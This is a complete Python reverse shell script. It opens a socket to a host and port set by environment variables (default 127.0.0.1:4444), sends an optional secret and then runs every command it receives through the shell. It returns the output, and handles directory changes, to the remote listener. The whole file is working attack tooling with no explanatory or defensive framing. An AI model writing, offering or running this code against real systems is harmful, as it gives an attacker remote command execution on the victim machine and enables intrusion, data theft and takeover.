import socket,subprocess
import os
from base64 import b64decode

running = True
cwd = subprocess.check_output("pwd", shell=True).decode().strip()

port = os.environ.get("PORT", 4444)
host = os.environ.get("HOST", "127.0.0.1")
secret = os.environ.get("SECRET")

with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
    s.connect((host, port))
    try:
        if secret:
            s.send(secret.encode())

        while running:
            data = s.recv(1024)
            if not data:
                break
            cmd = data.decode().strip()
            if cmd.startswith("cd "):
                try:
                    path = cmd.split(" ", 1)[1]
                    os.chdir(path)
                    cwd = subprocess.check_output("pwd", shell=True).decode().strip()
                    s.send(cwd.encode())
                except Exception as e:
                    s.send(str(e).encode())
                continue

            result = subprocess.run(data.decode(), shell=True, cwd=cwd, capture_output=True, text=True)
            if result.stdout:
                s.send(result.stdout.encode())
            if result.stderr:
                s.send(result.stderr.encode())
    except:
        pass

